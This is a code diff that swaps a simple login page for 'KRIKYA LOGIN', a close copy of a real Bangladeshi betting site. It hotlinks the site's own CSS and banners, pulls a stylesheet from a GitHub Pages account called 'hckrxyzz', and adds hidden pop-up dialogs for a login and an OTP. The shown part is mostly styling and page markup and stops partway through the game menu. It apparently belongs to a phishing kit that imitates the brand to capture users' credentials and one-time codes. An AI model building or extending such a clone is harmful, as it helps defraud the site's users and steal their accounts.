@@ -1,109 +1,3115 @@
 <!DOCTYPE html>
 <html lang="en">
+
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Login</title>
-    <style>
-        body {
-            font-family: Arial, sans-serif;
-            background-color: #f9f9f9;
-            margin: 0;
-            padding: 0;
-        }
-        .container {
-            max-width: 400px;
-            margin: 50px auto;
-            padding: 20px;
-            background-color: #ffffff;
-            border-radius: 8px;
-            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
-        }
-        .header {
-            text-align: center;
-            color: #333;
-            margin-bottom: 20px;
-        }
-        .input-group {
-            margin-bottom: 15px;
-        }
-        label {
-            display: block;
-            margin-bottom: 5px;
-            color: #555;
-        }
-        input[type="text"],
-        input[type="password"] {
-            width: 100%;
-            padding: 10px;
-            border: 1px solid #ccc;
-            border-radius: 5px;
-        }
-        .error {
-            color: red;
-            font-size: 12px;
-        }
-        .login-btn {
-            background-color: #ffcc00;
-            color: #fff;
-            padding: 10px;
-            border: none;
-            border-radius: 5px;
-            width: 100%;
-            cursor: pointer;
-        }
-        .watch-video {
-            background-color: #ff8800;
-            color: #fff;
-            padding: 10px;
-            border: none;
-            border-radius: 5px;
-            width: 100%;
-            cursor: pointer;
-            margin-bottom: 20px;
-        }
-        .footer {
-            text-align: center;
-            color: #333;
-        }
-    </style>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>KRIKYA LOGIN</title>
+  <link href="https://hckrxyzz.github.io/Xyzz/krikyacss.css" rel="stylesheet">
+  <link href="https://www.krikya11.com/css/chunk-vendors~2b810a6f.20fa9efe.css" rel="stylesheet">
+  <link href="https://www.krikya11.com/css/chunk-vendors~d939e436.6ac4ec36.css" rel="stylesheet">
+  <link href="https://www.krikya11.com/css/chunk-vendors~b11b46cd.2fab59e1.css" rel="stylesheet">
+  <link href="https://www.krikya11.com/css/chunk-vendors~c1dd23ef.f257e35b.css" rel="stylesheet">
+  <link href="https://www.krikya11.com/css/chunk-vendors~dde583c9.8aa35a4f.css" rel="stylesheet">
+  <link href="https://www.krikya11.com/css/chunk-vendors~4b6931ed.59314658.css" rel="stylesheet">
+  <link href="https://www.krikya11.com/css/app~d0ae3f07.c1e1719a.css" rel="stylesheet">
+  <link href="https://www.krikya11.com/css/app~e73b60ec.744e1658.css" rel="stylesheet">
+  <link href="https://www.krikya11.com/css/app~8becc859.f367d48c.css" rel="stylesheet">
+  <link href="https://www.krikya11.com/css/app~ae84dd0a.56ed03b8.css" rel="stylesheet">
+  <link href="https://www.krikya11.com/css/app~aed79fb4.ea8dbcd1.css" rel="stylesheet">
+  <link href="https://www.krikya11.com/css/app~1291d11b.c1b4e74c.css" rel="stylesheet">
+  <link href="https://www.krikya11.com/css/app~a0cae88c.e4e6db3e.css" rel="stylesheet">
+  <link href="https://www.krikya11.com/css/app~6fefc77d.49866015.css" rel="stylesheet">
+  <link href="https://www.krikya11.com/css/app~e2b3b7a0.24c24e13.css" rel="stylesheet">
+  <link href="https://www.krikya11.com/css/app~2591b2df.79a6d124.css" rel="stylesheet">
+  <link href="https://www.krikya11.com/css/app~1336c15f.2edded45.css" rel="stylesheet">
+  <link href="https://www.krikya11.com/css/app~cb154c8a.72f85415.css" rel="stylesheet">
+  <link href="https://www.krikya11.com/css/app~d00a4e0a.4afb800b.css" rel="stylesheet">
+  <link href="https://www.krikya11.com/css/app~03c2e492.63d30e18.css" rel="stylesheet">
+  <link href="https://www.krikya11.com/css/app~17d5d749.8789e379.css" rel="stylesheet">
+  <link href="https://www.krikya11.com/css/app~0e32f6fa.6c79b68d.css" rel="stylesheet">
+  <link href="https://www.krikya11.com/css/app~97e4094c.49432c55.css" rel="stylesheet">
+  <link href="https://www.krikya11.com/css/app~67ce3202.94b01963.css" rel="stylesheet">
+  <link href="https://www.krikya11.com/css/app~2dafbdd6.c28e87fb.css" rel="stylesheet">
+  <link href="https://www.krikya11.com/css/app~60938006.f8f42339.css" rel="stylesheet">
+  <link href="https://www.krikya11.com/css/app~3ea47f77.2258a5a2.css" rel="stylesheet">
+  <link href="https://www.krikya11.com/css/app~1133870d.a1447d50.css" rel="stylesheet">
+  <link href="https://www.krikya11.com/css/app~d1dd7914.4ad2d8e6.css" rel="stylesheet">
+  <link href="https://www.krikya11.com/css/app~9e62af0d.9190bb7a.css" rel="stylesheet">
+  <link href="https://www.krikya11.com/css/app~f6f6ed3b.95fcad59.css" rel="stylesheet">
+  <link href="https://www.krikya11.com/css/app~bc6a595f.1f40ec0e.css" rel="stylesheet">
+  <!-- Inline styles consolidated -->
+  <style>
+    .watch-video-container {
+      background-color: var(--v-background-lighten1);
+      padding: 12px;
+      align-items: center;
+      margin: 20px 0 0;
+      position: relative
+    }
+
+    .watch-video-container .watch-video-label {
+      width: calc(100% - 160px);
+      font-size: 15px;
+      font-weight: 700
+    }
+
+    @media screen and (max-width:767px) {
+      .watch-video-container .watch-video-label {
+        width: calc(100% - 128px);
+        font-size: 13px
+      }
+    }
+
+    .watch-video-container .watch-video-button {
+      display: flex;
+      width: 160px;
+      text-align: right;
+      justify-content: end
+    }
+
+    @media screen and (max-width:767px) {
+      .watch-video-container .watch-video-button {
+        width: 128px
+      }
+    }
+
+    .watch-video-container .watch-video-button button {
+      width: 152px;
+      font-size: 14px !important;
+      text-transform: uppercase !important;
+      color: #fff !important;
+      background-color: #f47922 !important
+    }
+
+    @media screen and (max-width:767px) {
+      .watch-video-container .watch-video-button button {
+        width: 120px;
+        font-size: 12px !important
+      }
+    }
+
+    .watch-video-container .watch-video-close {
+      display: flex;
+      position: absolute;
+      top: -10px;
+      right: -10px;
+      cursor: pointer
+    }
+
+    @media screen and (max-width:767px) {
+      .watch-video-container .watch-video-close {
+        right: -4px
+      }
+    }
+
+    .watch-video-container .watch-video-close img {
+      width: 26px;
+      height: 26px
+    }
+
+    .captcha-code {
+      display: flex;
+      justify-content: flex-end
+    }
+
+    .captcha-code .captcha {
+      text-align: center
+    }
+
+    .captcha-code .captcha,
+    .captcha-code .refresh {
+      min-height: 40px;
+      height: 40px;
+      background-color: var(--v-primary-base)
+    }
+
+    .captcha-code .refresh {
+      display: inline-flex;
+      width: 28px
+    }
+
+    .captcha-code .refresh i {
+      color: #fff
+    }
+
+    .play-now-progress-bar {
+      width: 100% !important;
+      text-align: center
+    }
+
+    .play-now-progress-bar .v-card {
+      background-color: transparent
+    }
+
+    .play-now-progress-bar .play-now-progress-bar-title {
+      font-size: 60px
+    }
+
+    .play-now-progress-bar .play-now-progress-bar-message {
+      font-size: 34px
+    }
+
+    .play-now-progress-bar .play-now-progress-bar-desc {
+      font-size: 16px
+    }
+
+    .play-now-progress-bar-small-title {
+      font-size: 14px;
+      font-weight: 700;
+      text-align: left
+    }
+
+    .play-now-title {
+      font-size: 20px;
+      font-weight: 700
+    }
+
+    .play-now-desc {
+      font-size: 16px
+    }
+
+    .play-box {
+      position: relative;
+      padding: 30px 0
+    }
+
+    .play-box .play-row {
+      height: 100%
+    }
+
+    .play-box .play-row .play-col {
+      position: relative
+    }
+
+    .play-box .play-row .play-col .play-desc {
+      border-bottom: 4px solid var(--v-primary-base)
+    }
+
+    @media(max-width:1500px) {
+      .play-now-title {
+        font-size: 18px;
+        font-weight: 700
+      }
+
+      .play-now-desc {
+        font-size: 14px
+      }
+
+      .play-now-progress-bar .v-progress-circular__info {
+        padding-top: 10px
+      }
+
+      .play-now-progress-bar .play-now-progress-bar-title {
+        font-size: 55px
+      }
+
+      .play-now-progress-bar .play-now-progress-bar-message {
+        font-size: 30px
+      }
+
+      .play-now-progress-bar .play-now-progress-bar-desc {
+        font-size: 14px
+      }
+    }
+
+    @media(max-width:1263px) {
+      .play-box .play-row .play-col .play-desc {
+        font-size: 26px
+      }
+
+      .play-now-progress-bar-box {
+        padding: 0 25px;
+        min-width: 100%;
+        margin: auto 0
+      }
+
+      .play-now-progress-bar-box .play-now-progress-bar .play-now-progress-bar-title {
+        font-size: 60px
+      }
+
+      .play-now-progress-bar-box .play-now-progress-bar .play-now-progress-bar-message {
+        font-size: 34px
+      }
+
+      .play-now-progress-bar-box .play-now-progress-bar .play-now-progress-bar-desc {
+        font-size: 16px
+      }
+
+      .play-now-description-box {
+        padding: 0 25px;
+        min-width: 100%;
+        margin: auto 0
+      }
+    }
+
+    @media(max-width:1024px) {
+      .play-box .play-row .play-col .play-desc {
+        font-size: 24px
+      }
+    }
+
+    @media(max-width:959px) {
+      .play-now-progress-bar-box .play-now-progress-bar {
+        width: 200px !important;
+        height: 200px !important
+      }
+
+      .play-now-progress-bar-box {
+        text-align: center
+      }
+
+      .play-now-progress-bar-box .play-now-progress-bar {
+        width: 100% !important;
+        text-align: center
+      }
+
+      .play-now-progress-bar-box .play-now-progress-bar .play-now-progress-bar-title {
+        font-size: 45px
+      }
+
+      .play-now-progress-bar-box .play-now-progress-bar .play-now-progress-bar-message {
+        font-size: 25px
+      }
+
+      .play-now-progress-bar-box .play-now-progress-bar .play-now-progress-bar-desc {
+        font-size: 12px
+      }
+    }
+
+    @media(max-width:599px) {
+      .play-now-progress-bar-box .play-now-progress-bar {
+        width: 200px !important;
+        height: 200px !important
+      }
+
+      .play-with-us-button {
+        padding: 0 25px
+      }
+    }
+
+    @media(max-width:425px) {
+      .play-now-title {
+        font-size: 14px
+      }
+
+      .play-now-desc {
+        font-size: 12px
+      }
+    }
+
+    .close_instant {
+      top: 17px
+    }
+
+    .v-dialog.box_instant {
+      height: 544px;
+      box-shadow: none !important
+    }
+
+    .upper-coinTips {
+      text-align: center;
+      text-transform: uppercase;
+      color: #001958;
+      font-size: 14px;
+      font-weight: 700
+    }
+
+    .lower-coinTips {
+      text-align: center;
+      color: #000;
+      font-size: 11px;
+      font-weight: 600
+    }
+
+    .custom-container {
+      display: flex;
+      flex-wrap: wrap;
+      justify-content: center;
+      border: 2px solid #14805e;
+      border-radius: 5px;
+      padding: 10px 0;
+      margin: 10px !important;
+      height: 120px;
+      box-shadow: 0 2px 2px 1px rgba(6, 8, 15, .1), 0 4px 4px 1px rgba(6, 8, 15, .1), 0 8px 8px 1px rgba(6, 8, 15, .1), 0 1px 1px 1px rgba(6, 8, 15, .1), 0 32px 32px 1px rgba(6, 8, 15, .1), inset 0 0 3px 0 #ffdd8f;
+    }
+
+    @media(max-width:424px) {
+      .custom-container {
+        margin: 10px 2px !important
+      }
+    }
+
+    .item-image-pop-up {
+      width: 50px;
+      height: 50px
+    }
+
+    .item-name {
+      width: 100%;
+      font-weight: 700;
+      font-size: 9px;
+      white-space: nowrap
+    }
+
+    @media(max-width:450px) {
+      .item-name {
+        font-size: 8px
+      }
+    }
+
+    .item-button {
+      font-size: 10px !important;
+      width: 100%;
+      text-transform: none !important;
+      background-color: #f56908 !important;
+      color: #fff !important;
+      height: 27px !important
+    }
+
+    .item-button-close {
+      background-color: var(--v-primary-base) !important;
+      border-radius: 5px;
+      color: #fff !important;
+      width: 90% !important;
+      margin-bottom: 10px
+    }
+
+    .coins-Tips-card {
+      background-color: #fff;
+      padding: 0;
+      border-radius: 4px
+    }
+
+    .coins-Tips-card .coins-Tips-card-title {
+      background-color: var(--v-primary-base);
+      border-radius: 4px 4px 0 0
+    }
+
+    .coins-Tips-card .dialog-close-icon {
+      color: #fff !important
+    }
+
+    .close_instant {
+      right: 2%
+    }
+
+    @media(max-width:750px) {
+      .popupImage>img {
+        width: 385px
+      }
+
+      .close_instant {
+        right: 20px
+      }
+    }
+
+    @media(max-width:450px) {
+      .popupImage>img {
+        width: 305px
+      }
+
+      .close_instant {
+        right: 5px
+      }
+    }
+
+    .my-coins {
+      display: flex;
+      width: 100%;
+      height: 56px;
+      margin: 12px 12px;
+      padding: 4px 24px;
+      justify-content: space-between;
+      align-items: center;
+      border-radius: 4px;
+      box-shadow: 1px 1px 12px 2px hsla(0, 0%, 47.1%, .46);
+      -webkit-box-shadow: 1px 1px 12px 2px hsla(0, 0%, 47.1%, .46);
+      -moz-box-shadow: 1px 1px 12px 2px hsla(0, 0%, 47.1%, .46);
+      font-size: 18px
+    }
+
+    .my-coins .img-my-coins {
+      width: 36px !important;
+      height: 36px !important;
+      max-width: 36px !important;
+      max-height: 36px !important;
+      margin-right: 6px
+    }
+
+    .my-coins .coins {
+      font-weight: 700;
+      align-self: center;
+      color: var(--v-secondary-base)
+    }
+
+    .gain-coin-container {
+      margin: 0 4px !important
+    }
+
+    .button-primary {
+      position: relative;
+      min-height: 28px;
+      min-width: 80px;
+      border-radius: 3px;
+      background: linear-gradient(90deg, #fbc103 0, #f79604 15%, #f79604 30%, #fbc103 55%, #fbc103);
+      background-position: -50% 0;
+      box-shadow: 0 6px 6px 1px rgba(6, 8, 15, .1), 0 6px 6px 1px rgba(6, 8, 15, .1), 0 6px 6px 1px rgba(6, 8, 15, .1), inset 0 0 3px 0 #ffdd8f;
+      transition: background-position .3s ease-in, box-shadow .5s ease-out .1s, text-shadow .3s ease-in .1s;
+      color: #fff
+    }
+
+    header,
+    .header,
+    .modal-header {
+      background: linear-gradient(180deg, #409572 0, #62b792 15%, #62b792 30%, #409572 55%, #409572);
+      box-shadow: 0 2px 2px 1px rgba(6, 8, 15, .1), 0 4px 4px 1px rgba(6, 8, 15, .1), 0 8px 8px 1px rgba(6, 8, 15, .1), 0 16px 16px 1px rgba(6, 8, 15, .1), 0 32px 32px 1px rgba(6, 8, 15, .1), inset 0 0 3px 0 #48ad7f;
+    }
+
+    .button-primary.greenish_button {
+      background: linear-gradient(180deg, #409572 0, #62b792 15%, #62b792 30%, #409572 55%, #409572);
+      box-shadow: 0 2px 8px #000 !important
+    }
+
+    .button-primary.orangish_button {
+      background: linear-gradient(180deg, #f76301 0, #f27703 15%, #f27703 30%, #f76301 55%, #f76301);
+      box-shadow: 0 2px 8px #000 !important
+    }
+
+    .button-primary:before {
+      content: "";
+      position: absolute;
+      top: 0;
+      left: 0;
+      bottom: 0;
+      right: 0;
+      background-image: linear-gradient(180deg, #409572 0, #62b792 15%, #62b792 30%, #409572 55%, #409572);
+      background-position: 0 0;
+      background-size: 100%
+    }
+
+    .button-primary:hover {
+      transition-duration: .6s;
+      transition-delay: .3s;
+      background-position: 0 0;
+      background: linear-gradient(90deg, #fbc103 0, #f79604 15%, #f79604 65%, #fbc103);
+      box-shadow: 0 2px 2px 1px rgba(6, 8, 15, .1), 0 4px 4px 1px rgba(6, 8, 15, .1), 0 8px 8px 1px rgba(6, 8, 15, .1), 0 16px 16px 1px rgba(6, 8, 15, .1), 0 32px 32px 1px rgba(6, 8, 15, .1), inset 0 0 3px 0 #ffdd8f;
+      text-shadow: 0 1px 3px #967302
+    }
+
+    .button-primary.greenish_button:hover {
+      transition-duration: .6s;
+      transition-delay: .3s;
+      background-position: 0 0;
+      background: #62b792
+    }
+
+    .grren-shadow {
+      background: linear-gradient(180deg, #409572 0, #62b792 15%, #62b792 30%, #409572 55%, #409572);
+      box-shadow: 2px 2px 10px rgba(19, 19, 19, 0.711);
+    }
+
+    .button-primary.orangish_button:hover {
+      transition-duration: .6s;
+      transition-delay: .3s;
+      background-position: 0 0;
+      background: #f27703
+    }
+
+    .close_instant {
+      position: absolute;
+      width: auto;
+      float: right;
+      top: 37px;
+      right: 5%;
+      z-index: 99999
+    }
+
+    .box_instant_login {
+      height: 450px !important;
+      overflow: auto !important;
+      box-shadow: none !important
+    }
+
+    .popupImage {
+      text-align: center
+    }
+
+    .popupImage>img {
+      text-align: center;
+      width: 430px;
+      height: auto;
+      aspect-ratio: 430/532;
+      padding: 5px;
+      border-radius: 20px
+    }
+
+    @media (max-width:750px) {
+      .popupImage>img {
+        width: 385px
+      }
+
+      .close_instant {
+        right: 2%
+      }
+    }
+
+    @media (max-width:450px) {
+      .popupImage>img {
+        width: 305px
+      }
+
+      .close_instant {
+        right: 2%
+      }
+    }
+
+    .max_height_setting {
+      max-height: 270px;
+      overflow-y: auto
+    }
+
+    .v-dialog {
+      overflow: hidden
+    }
+
+    .v-dialog:not(.v-dialog--fullscreen) {
+      max-height: 97%
+    }
+
+    .dialog-logo[data-v-d6ec978c] {
+      width: 133px;
+      height: 22px;
+      padding-top: 4px
+    }
+
+    .dialog-card[data-v-d6ec978c] {
+      transition: all .3s ease-in-out .3s;
+      opacity: 1;
+      font-size: 12px
+    }
+
+    .dialog-card {
+      font-size: 16px;
+      background: linear-gradient(180deg, #409572 0, #62b792 15%, #62b792 30%, #409572 55%, #409572);
+    }
+
+    .dialog-card .dialog-subtitle[data-v-d6ec978c] {
+      font-size: 14px
+    }
+
+    .dialog-header[data-v-d6ec978c] {
+      position: relative;
+      background: var(--v-primary-base);
+      border: 1px solid var(--v-primary-base)
+    }
+
+    .dialog-close-icon[data-v-d6ec978c] {
+      cursor: pointer
+    }
+
+    .dialog-close-icon[data-v-d6ec978c]:hover {
+      transition: .5s ease-out;
+      background-color: var(--v-primary-lighten1)
+    }
+
+    .dialog-row[data-v-d6ec978c] {
+      overflow-y: auto;
+      scrollbar-width: thin;
+      padding: 16px 12px
+    }
+
+    .dialog-divider[data-v-d6ec978c] {
+      border-width: .8px !important;
+      border-color: #acacac !important;
+      height: 100%
+    }
+
+    @media(max-height:600px) {
+      .dialog-row[data-v-d6ec978c] {
+        max-height: 300px
+      }
+    }
+
+    @media(max-height:400px) {
+      .dialog-row[data-v-d6ec978c] {
+        height: 200px
+      }
+    }
+
+    .custom-readonly-field.v-text-field--readonly .v-input__control .v-input__slot {
+      background-color: transparent !important
+    }
+
+    .v-text-field--outlined fieldset {
+      border-width: 1px
+    }
+
+    .v-text-field--outlined.v-input--is-verify fieldset {
+      border-color: var(--v-primary-base);
+      border-width: 2px
+    }
+
+    .input-field-label {
+      font-size: 14px
+    }
+
+    .theme--dark.v-input input,
+    .theme--dark.v-input textarea,
+    .v-input input,
+    .v-input textarea {
+      color: var(--v-primary-base)
+    }
+
+    .v-text-field.v-text-field--enclosed .v-text-field__details {
+      margin: 0
+    }
+
+    .input-field .v-select.v-text-field--outlined:not(.v-text-field--single-line) .v-select__selections {
+      color: #000
+    }
+
+    .input-field .v-icon,
+    .input-field .v-input__icon {
+      color: #fbb70d
+    }
+
+    .input-field .v-input__slot {
+      margin: 0
+    }
+
+    .input-field .v-input__slot .v-select__slot .v-select__selections {
+      color: #000
+    }
+
+    .input-field .v-input__slot .v-select__slot .v-icon--disabled,
+    .input-field .v-input__slot .v-select__slot .v-select__selections .v-select__selection--disabled {
+      color: #c9c9c9 !important
+    }
+
+    .input-field .v-input__append-outer,
+    .input-field .v-input__prepend-inner {
+      margin-top: 0 !important;
+      align-self: center
+    }
+
+    .input-field .v-input__append-inner {
+      margin: 0;
+      align-self: center
+    }
+
+    .input-field.v-input--is-readonly input {
+      color: #3a3a3a !important;
+      opacity: .7
+    }
+
+    .input-field.v-input--is-readonly .v-input__slot {
+      background-color: rgba(0, 0, 0, .1)
+    }
+
+    .input-field .v-input__control .v-input__slot {
+      min-height: 40px;
+      height: 40px
+    }
+
+    .input-field .v-input__control .v-text-field__details {
+      margin-bottom: 0 !important
+    }
+
+    .input-field .v-input__control .v-text-field__details .v-messages__message {
+      font-size: 11px
+    }
+
+    .input-field .custom-date-picker .v-date-picker-table td {
+      padding: 0 !important
+    }
+
+    .secondary_button[data-v-3b7d3367] {
+      background: transparent !important;
+      text-decoration: underline;
+      color: var(--v-navigator_active-base) !important;
+      box-shadow: none !important
+    }
+
+    .v-btn.theme-button[data-v-3b7d3367] {
+      text-transform: capitalize;
+      border-radius: 10px;
+      height: auto;
+      font-size: 16px
+    }
+
+    @media(max-width:599px) {
+      .v-btn.dialog-button[data-v-3b7d3367] {
+        width: 100% !important
+      }
+    }
+
+
+
+    .login-btn {
+      font-size: 16px;
+      border: none;
+      cursor: pointer;
+    }
+
+    .signup-Btn {
+      background: linear-gradient(180deg, #f76301 0, #f27703 15%, #f27703 30%, #f76301 55%, #f76301);
+      color: #fff;
+      border: none;
+      cursor: pointer;
+      text-align: center;
+    }
+
+    #popupModal {
+      display: none;
+      transform-origin: center center 0px;
+      max-width: 400px;
+      margin: center center 0px;
+      padding: 20px;
+    }
+
+    #otpPopup {
+      display: none;
+      transform-origin: center center 0px;
+      max-width: 400px;
+      margin: center center 0px;
+      padding: 20px;
+    }
+  </style>
 </head>
+
 <body>
+  <div class="v-application v-application--is-ltr theme--light" id="app">
+    <div class="v-application--wrap">
+      <header class="header v-sheet theme--light v-toolbar v-toolbar--dense full-width header-top elevation-3"
+        style="height: 45px;">
+        <div class="v-toolbar__content" style="height: 48px;">
+          <div class="row mobile">
+            <div class="d-flex flex-grow-0 align-center col col-2">
+              <button type="button"
+                class="v-app-bar__nav-icon v-btn v-btn--icon v-btn--round theme--light v-size--default white--text"
+                style="height: 18px; width: 22px;" color="white" height="18" width="22">
+                <span class="v-btn__content"><i aria-hidden="true"
+                    class="v-icon notranslate mdi mdi-menu theme--light"></i></span>
+              </button>
+            </div>
+            <div class="d-flex justify-space-around pt-2 col">
+              <a href="/" class="d-flex justify-center align-center router-link-exact-active router-link-active">
+                <img width="120px" height="30" src="https://www.krikya11.com/static/image/home/logo.webp"
+                  alt="krikya logo">
+              </a>
+            </div>
+            <div class="d-flex align-center mobile-header-rightBtns col col-2">
+              <button type="button"
+                class="v-btn v-btn--icon v-btn--plain v-btn--round theme--light v-size--default white--text">
+                <span class="v-btn__content">
+                  <img src="https://www.krikya11.com/static/svg/layout/tr_livechat.svg" width="32" height="32"
+                    contain="true">
+                </span>
+              </button>
+            </div>
+          </div>
+        </div>
+      </header>
+      <main>
+        <div class="page-navigator hidden-sm-and-down">
+          <div class="page-navigator-wrapper">
+            <div class="page-navigator-item">
+              <a href="/"
+                class="page-navigator-button page-navigator-button--active v-btn--active v-btn v-btn--router v-btn--text theme--light v-size--default">
+                <span class="v-btn__content"><i aria-hidden="true"
+                    class="v-icon notranslate mdi mdi-home theme--light"></i></span>
+              </a>
+            </div>
+            <div class="page-navigator-item">
+              <a href="/promotion"
+                class="page-navigator-button v-btn v-btn--router v-btn--text theme--light v-size--default">
+                <span class="v-btn__content"><label class="text-center text-capitalize"
+                    style="cursor: pointer;">Promotion</label></span>
+              </a>
+            </div>
+          </div>
+        </div>
+        <div class="body ">
+          <div class="bg_home">
+            <div class="banner-content">
+              <div class="mb-bg-color banner-height">
+                <div class="flicking flicking1 mt-3 mb-2 flicking-viewport"
+                  style="touch-action: pan-y; user-select: none;">
+                  <div class="flicking-camera" style="transform: translate(-568.378px);">
+                    <div class="mx-1 flicking-panel mob_banner"><img
+                        src="https://jiliwin.9terawolf.com/cms/banner/image/en-mobile-67e91a0699ee1.jpg" width="320"
+                        height="150" alt="Celebrate Eid with KRIKYA &amp; Get Up to ৳8,000 in Bonuses!"
+                        class="krikya_panel"></div>
+                    <div class="mx-1 flicking-panel mob_banner"><img
+                        src="https://jiliwin.9terawolf.com/cms/banner/image/en-mobile-67e18362cc072.jpg" width="320"
+                        height="150"
+                        alt="Spin, Stake &amp; Win a Samsung Galaxy S25 Ultra, iPhone 16, iPad, and JILI Rich Cards!"
+                        class="krikya_panel"></div>
+                    <div class="mx-1 flicking-panel mob_banner active"><img
+                        src="https://jiliwin.9terawolf.com/cms/banner/image/en-mobile-67dd5107e9669.jpg" width="320"
+                        height="150" alt="Get a 5% Bonus up to ৳1,000 Every Day! This IPL Season is Shining!"
+                        class="krikya_panel"></div>
+                    <div class="mx-1 flicking-panel mob_banner"><img
+                        src="https://jiliwin.9terawolf.com/cms/banner/image/en-mobile-67dd51f2c094c.jpg" width="320"
+                        height="150"
+                        alt="More Play, More Bonus! Get Up to ৳10,000 Every Week! Still thinking? Dive in now!"
+                        class="krikya_panel"></div>
+                    <div class="mx-1 flicking-panel mob_banner"><img
+                        src="https://jiliwin.9terawolf.com/cms/banner/image/en-mobile-67dd5179eb38c.jpg" width="320"
+                        height="150" alt="Win or Get 100% Refund, Up to ৳3,000 Bonus! Risk-Free Play Mode - ON!"
+                        class="krikya_panel"></div>
+                    <div class="mx-1 flicking-panel mob_banner"><img
+                        src="https://jiliwin.9terawolf.com/cms/banner/image/en-mobile-67c7fea501f8e.jpg" width="320"
+                        height="150" alt="5% + 5% which is 10% Bonus with (1x TO), Deposit Daily From 10 AM - 5 PM!"
+                        class="krikya_panel"></div>
+                    <div class="mx-1 flicking-panel mob_banner"><img
+                        src="https://jiliwin.9terawolf.com/cms/banner/image/en-mobile-676e0793574b9.jpg" width="320"
+                        height="150" alt="Krikya Access Notice" class="krikya_panel"></div>
+                  </div>
+                  <div class="flicking-pagination flicking-pagination-bullets"><span
+                      class="paging-bullet"><i></i><b></b></span>
+                    <span class="paging-bullet"><i></i><b></b></span>
+                    <span class="paging-bullet flicking-pagination-bullet-active"><i></i><b></b></span>
+                    <span class="paging-bullet"><i></i><b></b></span>
+                    <span class="paging-bullet"><i></i><b></b></span>
+                    <span class="paging-bullet"><i></i><b></b></span>
+                    <span class="paging-bullet"><i></i><b></b></span>
+                  </div>
+                </div>
+              </div><!---->
+              <div class="marquee-row">
+                <div class="marquee-wrapper">
+                  <div class="marquee-icon">
+                    <img src="https://gamius88.github.io/page/announcement-icon.svg" width="25" height="25"
+                      style="background-color: rgb(55, 143, 106);">
+                  </div>
+                  <div class="marqueeMobile">
+                    <div class="marquee-content"><span><label class="d-inline-block home-announcment-content">IMPORTANT
+                          ANNOUCEMENT !!!</label><label class="d-inline-block home-announcment-content"> : PLEASE BE
+                          ADVISED THAT KRIKYA will not request transfer of funds to any third party account(s), and
+                          please does not share your personal information (login credentials, payment receipt and OTP)
+                          to anyone. If you have any uncertainty, please contact KRIKYA Customer Support at LIVE CHAT.
+                          <p></p>
+                        </label></span></div>
+                  </div>
+                </div>
+              </div>
+            </div>
+            <div class="game-menu">
+              <div>
+                <div id="game-menu" class="row no-gutters">
+                  <div id="game-menu-full" class="row game-menu-wrapper no-gutters" style="width: 100%;"><button
+                      type="button"
+                      class="v-btn v-btn--text theme--light v-size--default game-menu-content font-weight-bold caption selected"
+                      style="height: auto;"><span class="v-btn__content">
+                        <div class="game-menu-image" style="--src: url('https://gamius88.github.io/page/hotgame.png');">
+                        </div>
+                        <div class="game-menu-title">Hot games</div>
+                      </span></button><button type="button"
+                      class="v-btn v-btn--text theme--light v-size--default game-menu-content font-weight-bold caption"
+                      style="height: auto;"><span class="v-btn__content">
+                        <div class="game-menu-image" style="--src: url('https://gamius88.github.io/page/cricket.svg');">
+                        </div>
+                        <div class="game-menu-title">Cricket</div>
+                      </span></button><button type="button"
+                      class="v-btn v-btn--text theme--light v-size--default game-menu-content font-weight-bold caption"
+                      style="height: auto;"><span class="v-btn__content">
+                        <div class="game-menu-image" style="--src: url('https://gamius88.github.io/page/ld.svg');">
+                        </div>
+                        <div class="game-menu-title">casino</div>
+                      </span></button><button type="button"
+                      class="v-btn v-btn--text theme--light v-size--default game-menu-content font-weight-bold caption"
+                      style="height: auto;"><span class="v-btn__content">
+                        <div class="game-menu-image" style="--src: url('https://gamius88.github.io/page/rng.svg');">
+                        </div>
+                        <div class="game-menu-title">Slot</div>
+                      </span></button><button type="button"
+                      class="v-btn v-btn--text theme--light v-size--default game-menu-content font-weight-bold caption"
+                      style="height: auto;"><span class="v-btn__content">
+                        <div class="game-menu-image" style="--src: url('https://gamius88.github.io/page/crash.svg');">
+                        </div>
+                        <div class="game-menu-title">Crash</div>
+                      </span></button><button type="button"
+                      class="v-btn v-btn--text theme--light v-size--default game-menu-content font-weight-bold caption"
+                      style="height: auto;"><span class="v-btn__content">
+                        <div class="game-menu-image" style="--src: url('https://gamius88.github.io/page/table.svg');">
+                        </div>
+                        <div class="game-menu-title">Table</div>
+                      </span></button><button type="button"
+                      class="v-btn v-btn--text theme--light v-size--default game-menu-content font-weight-bold caption"
+                      style="height: auto;"><span class="v-btn__content">
+                        <div class="game-menu-image" style="--src: url('https://gamius88.github.io/page/sb.svg');">
+                        </div>
+                        <div class="game-menu-title">Sports</div>
+                      </span></button><button type="button"
+                      class="v-btn v-btn--text theme--light v-size--default game-menu-content font-weight-bold caption"
+                      style="height: auto;"><span class="v-btn__content">
+                        <div class="game-menu-image" style="--src: url('https://gamius88.github.io/page/lottery.svg');">
+                        </div>
+                        <div class="game-menu-title">Lottery</div>
+                      </span></button><button type="button"
+                      class="v-btn v-btn--text theme--light v-size--default game-menu-content font-weight-bold caption"
+                      style="height: auto;"><span class="v-btn__content">
+                        <div class="game-menu-image" style="--src: url('https://gamius88.github.io/page/fishing.svg');">
+                        </div>
+                        <div class="game-menu-title">Fishing</div>
+                      </span></button></div>
+                </div>
+                <div class="mt-0 hidden-md-and-up game-card-box px-4 py-2">
+                  <div class="game-card-box-wrapper">
+                    <div class="game-card-box-item d-flex gT_homepageHot">
+                      <div aria-label="Exchange" role="img"
+                        class="v-image v-responsive banner-img d-flex justify-center align-center theme--light">
+                        <div class="v-responsive__content"><img
+                            src="https://jiliwin.9terawolf.com/cms/h8/image/6606659bba618.png"
+                            class="homepageHot_img"><!----><img src="https://gamius88.github.io/page/hot-icon.png"
+                            class="img-hot-home pos_right_top"></div>
+                      </div><span class="smallTextGameLocale">Exchange</span>
+                    </div>
+                    <div class="game-card-box-item d-flex gT_homepageHot">
+                      <div aria-label="Crazy Time (20,000x)" role="img"
+                        class="v-image v-responsive banner-img d-flex justify-center align-center theme--light">
+                        <div class="v-responsive__content"><img src="https://luckmedia.link/evo_crazy_time/thumb.webp"
+                            class="homepageHot_img"><!----><img src="https://gamius88.github.io/page/hot-icon.png"
+                            class="img-hot-home pos_right_top"></div>
+                      </div><span class="smallTextGameLocale">Crazy Time (20,000x)</span>
+                    </div>
+                    <div class="game-card-box-item d-flex gT_homepageHot">
